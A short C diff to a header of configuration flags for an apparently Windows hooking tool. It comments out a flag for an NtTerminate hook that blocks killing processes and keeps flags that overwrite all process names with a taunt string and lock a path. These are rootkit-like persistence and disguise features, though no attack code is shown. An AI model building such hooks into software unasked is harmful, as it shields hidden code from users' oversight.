@@ -11,7 +11,7 @@
 #define TAUNTVALUE L"kingsguard" // overwrite all process names 
 #endif
 
-#define NOTERM true // if true, NtTerminate hook prevents killing other processes
+// #define NOTERM false // if true, NtTerminate hook prevents killing other processes. CURRENTLY BROKEN
 
 #define PATHLOCK true // if true, lock path and subdirectories
 
